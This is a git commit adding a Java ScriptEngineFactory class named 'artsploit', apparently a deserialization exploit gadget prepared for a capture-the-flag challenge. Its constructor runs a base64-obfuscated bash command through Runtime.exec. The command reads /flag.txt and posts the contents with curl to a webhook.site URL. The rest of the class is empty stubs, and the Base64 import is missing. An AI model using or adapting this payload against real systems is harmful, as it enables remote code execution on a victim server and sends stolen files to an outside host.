d8b2784f3567e6bb21777773fc89ae1f799da01d
Crow <74257119+InfoSec-Crow@users.noreply.github.com>
2023-07-14 21:02:52 +0200

    Create AwesomeScriptEngineFactory.java

---
+++ src/artsploit/AwesomeScriptEngineFactory.java
@@ -0,0 +1,82 @@
+package artsploit;
+
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineFactory;
+import java.io.IOException;
+import java.util.List;
+
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+            String cmd = "cat /flag.txt | curl -XPOST -d @-  	https://webhook.site/c7477b44-3860-4d75-94de-aefebbca1a34"; // <-- your actual command here
+
+			String b64Cmd = Base64.getEncoder().encodeToString(cmd.getBytes());
+			cmd = "bash -c {echo,"+b64Cmd+"}|{base64,-d}|{bash,-i}"; // *nix only
+
+			Runtime.getRuntime().exec(cmd); //increase this probably
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public String getEngineName() {
+        return null;
+    }
+
+    @Override
+    public String getEngineVersion() {
+        return null;
+    }
+
+    @Override
+    public List<String> getExtensions() {
+        return null;
+    }
+
+    @Override
+    public List<String> getMimeTypes() {
+        return null;
+    }
+
+    @Override
+    public List<String> getNames() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageName() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageVersion() {
+        return null;
+    }
+
+    @Override
+    public Object getParameter(String key) {
+        return null;
+    }
+
+    @Override
+    public String getMethodCallSyntax(String obj, String m, String... args) {
+        return null;
+    }
+
+    @Override
+    public String getOutputStatement(String toDisplay) {
+        return null;
+    }
+
+    @Override
+    public String getProgram(String... statements) {
+        return null;
+    }
+
+    @Override
+    public ScriptEngine getScriptEngine() {
+        return null;
+    }
+}
